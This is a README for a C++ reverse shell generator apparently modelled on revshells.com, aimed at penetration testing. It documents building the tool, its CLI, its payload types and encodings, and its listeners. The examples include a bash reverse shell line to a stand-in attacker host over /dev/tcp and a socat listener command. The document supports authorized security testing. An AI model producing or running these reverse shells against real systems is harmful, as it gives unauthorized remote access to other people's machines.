# RevShells - C++ Reverse Shell Generator

A comprehensive C++ application for generating reverse shell payloads and listeners, inspired by revshells.com. This tool provides a structured, extensible framework for creating cross-platform reverse shells with various encoding options.

## Overview

RevShells is a command-line tool that generates reverse shell payloads for penetration testing and security research. It supports multiple platforms (Linux, Windows, macOS), various shell types, and encoding methods.

### Key Features

- **Multi-Platform Support**: Generate payloads for Linux, Windows, and macOS
- **Multiple Payload Types**: Reverse shells, bind shells, MSFVenom payloads, and HoaxShell
- **Extensive Listener Support**: 17+ listener implementations (netcat, socat, ncat, OpenSSL, etc.)
- **Flexible Shell Options**: bash, sh, zsh, /bin/sh, PowerShell, cmd
- **Encoding Options**: Base64, URL encoding, double URL encoding
- **Extensible Architecture**: Plugin-based system for adding new payloads and listeners

## Architecture

The application follows a clean, modular architecture:

```
src/
├── app/           # Main application entry point
├── core/          # Core interfaces and configuration
├── listeners/     # Listener factory and implementations
├── payloads/      # Payload factory and implementations
└── utils/         # Utility functions and encoders
```

### Core Components

- **PayloadFactory**: Generates platform-specific reverse shell payloads
- **ListenerFactory**: Manages various listener implementations
- **Options**: Configuration struct with enums for payload types, platforms, and encodings
- **Interfaces**: Abstract base classes for extensibility

## Compilation

### Prerequisites

- C++17 compatible compiler (GCC 7+, Clang 5+, MSVC 2017+)
- CMake 3.10+ (recommended)
- Git

### Linux

```bash
# Clone the repository
git clone <repository-url>
cd revshells

# Create build directory
mkdir build && cd build

# Configure and build
cmake ..
make

# Run the application
./revshells
```

### Windows

#### Using Visual Studio

```cmd
# Clone the repository
git clone <repository-url>
cd revshells

# Create build directory
mkdir build
cd build

# Configure for Visual Studio
cmake .. -G "Visual Studio 16 2019"

# Build
cmake --build . --config Release

# Run the application
Release\revshells.exe
```

#### Using MinGW-w64

```bash
# Install MinGW-w64 and CMake
# Clone the repository
git clone <repository-url>
cd revshells

# Create build directory
mkdir build && cd build

# Configure with MinGW
cmake .. -G "MinGW Makefiles"

# Build
mingw32-make

# Run the application
revshells.exe
```

### Cross-Compilation

#### Linux to Windows

```bash
# Install MinGW cross-compiler
sudo apt-get install mingw-w64

# Configure for cross-compilation
cmake .. -DCMAKE_TOOLCHAIN_FILE=../cmake/mingw-w64-x86_64.cmake

# Build
make
```

## Usage

### Basic Usage

```cpp
#include "payloads/PayloadFactory.h"
#include "core/Options.h"

int main() {
    Options opts;
    opts.host = "192.168.1.100";
    opts.port = 4444;
    opts.platform = Platform::LINUX;
    opts.payloadType = PayloadType::REVERSE;
    opts.interpreter = "bash";
    opts.encoding = Encoding::BASE64;
    
    PayloadFactory factory;
    std::string payload = factory.generateByType(opts);
    std::cout << "Payload: " << payload << std::endl;
    
    return 0;
}
```

### Command Line Interface

```bash
# Generate a Linux bash reverse shell
./revshells --host 192.168.1.100 --port 4444 --platform linux --type reverse --shell bash

# Generate a Windows PowerShell payload with base64 encoding
./revshells --host 10.0.0.1 --port 8080 --platform windows --type reverse --encoding base64

# List available listeners
./revshells --list-listeners

# List available shells
./revshells --list-shells
```

## Supported Payloads

### Payload Types
- **Reverse**: Traditional reverse shell connection
- **Bind**: Bind shell listening on target
- **MSFVenom**: Metasploit payload generation
- **HoaxShell**: Web-based shell delivery

### Platforms
- **Linux**: bash, sh, zsh, /bin/sh variants
- **Windows**: PowerShell, cmd.exe
- **macOS**: bash, sh, zsh variants

### Encodings
- **None**: Plain text payload
- **Base64**: Base64 encoded payload
- **URL**: URL encoded payload
- **Double URL**: Double URL encoded payload

## Supported Listeners

The application supports 17+ listener implementations:

- **netcat**: Traditional nc listener
- **ncat**: Nmap's netcat implementation
- **socat**: Multipurpose relay tool
- **OpenSSL**: SSL/TLS encrypted shells
- **pwncat**: Enhanced netcat with advanced features
- **rlwrap**: Readline wrapper for shells
- **msfconsole**: Metasploit console handler
- **PowerCat**: PowerShell-based netcat
- **HoaxShell**: Web-based shell framework
- And many more...

## Examples

### Generate Linux Reverse Shell

```cpp
Options opts;
opts.host = "attacker.com";
opts.port = 4444;
opts.platform = Platform::LINUX;
opts.payloadType = PayloadType::REVERSE;
opts.interpreter = "bash";

PayloadFactory factory;
std::string payload = factory.generateByType(opts);
// Output: bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

### Generate Windows PowerShell Payload

```cpp
Options opts;
opts.host = "192.168.1.100";
opts.port = 8080;
opts.platform = Platform::WINDOWS;
opts.payloadType = PayloadType::REVERSE;
opts.encoding = Encoding::BASE64;

PayloadFactory factory;
std::string payload = factory.generateByType(opts);
// Output: Base64 encoded PowerShell reverse shell
```

### Get Listener Command

```cpp
Options opts;
opts.port = 4444;
opts.listenerType = "socat";

PayloadFactory factory;
std::string listener = factory.listener("socat", opts);
// Output: socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Security Considerations

This tool is designed for:
- **Penetration Testing**: Authorized security assessments
- **Security Research**: Educational and research purposes
- **Red Team Exercises**: Authorized adversary simulations
- **Defensive Testing**: Blue team defensive capabilities

### Responsible Use

- Only use on systems you own or have explicit permission to test
- Comply with all applicable laws and regulations
- Follow responsible disclosure practices
- Use appropriate security controls in testing environments

## Contributing

See [DEVELOPMENT.md](DEVELOPMENT.md) for detailed information on:
- Adding new payload types
- Implementing new listeners
- Extending encoding methods
- Code architecture and patterns

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer

This tool is provided for educational and authorized testing purposes only. Users are responsible for ensuring they have proper authorization before using this tool and must comply with all applicable laws and regulations.